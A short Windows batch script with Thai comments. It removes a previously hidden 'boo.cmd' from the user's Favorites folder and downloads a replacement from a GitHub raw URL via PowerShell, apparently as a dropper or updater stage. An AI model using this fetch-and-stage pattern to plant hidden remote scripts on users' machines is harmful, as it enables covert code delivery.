@echo off
setlocal enabledelayedexpansion

REM ระบุชื่อไฟล์ที่ต้องการลบ
set "oldFile=%USERPROFILE%\Favorites\boo.cmd"

REM ตรวจสอบว่าไฟล์มีอยู่หรือไม่ก่อนที่จะลบ
if exist "%oldFile%" (
    attrib -h "%oldFile%" 2>nul
    del /q "%oldFile%"
    echo Deleted old file
) else (
    echo No old file found
)

REM ระบุ URL ของไฟล์ที่ต้องการดาวน์โหลด
set "fileURL=https://raw.githubusercontent.com/Stephan999s/src/main/boo.cmd"

REM ระบุโฟลเดอร์ที่ต้องการบันทึกไฟล์
set "destinationFolder=%USERPROFILE%\Favorites"

REM ใช้คำสั่ง PowerShell เพื่อดาวน์โหลดไฟล์
powershell -command "& { Invoke-WebRequest -Uri '%fileURL%' -OutFile ('%destinationFolder%\boo.cmd') }"

echo Download completed.

:end
